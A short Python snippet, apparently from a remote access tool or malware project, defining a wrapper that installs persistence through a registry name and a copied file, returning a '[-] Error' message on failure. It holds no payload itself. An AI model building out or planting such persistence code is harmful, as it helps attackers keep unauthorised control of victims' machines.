def install_persistence(platform, reg_name, copy_name):
    try:
        return platform.install_persistence(reg_name, copy_name)
    except Exception as e:
        return f'[-] Error creating persistence: {str(e)}'
